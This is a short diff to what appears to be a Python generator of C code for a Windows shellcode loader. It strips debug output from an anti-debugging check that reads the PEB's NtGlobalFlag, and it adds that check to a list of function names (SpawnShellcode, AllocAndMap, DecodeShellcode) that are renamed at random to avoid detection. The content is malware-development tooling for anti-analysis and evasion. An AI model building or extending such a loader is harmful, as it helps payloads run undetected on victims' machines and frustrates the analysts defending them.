@@ -39,7 +39,7 @@ HEADERS_C_CODE = """
 #include <ctype.h>
 #include <windows.h>
 
-//#define DEBUG
+#define DEBUG
 #undef DEBUG
 
 #define BIG_NUMBER 1<<30
@@ -65,10 +65,7 @@ int CheckNtGlobalFlag()
        : "=r" (peb)
        : "i"(48)
        : "%eax" );
-  printf("peb is %#x\\n", peb);
   flag = peb+0x68;
-  printf("NtGlobalFlag is at %#x\\n", flag);
-  printf("NtGlobalFlag is %#x\\n", *flag);
   return *flag & 0x70;
 }
 
@@ -207,7 +204,7 @@ return;
 """
 
 CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-WORDS_TO_OBFUSCATE = [ "SpawnShellcode", "AllocAndMap", "DecodeShellcode", ]
+WORDS_TO_OBFUSCATE = [ "SpawnShellcode", "AllocAndMap", "DecodeShellcode", "CheckNtGlobalFlag", ]
 
 
 def generate_random_word():
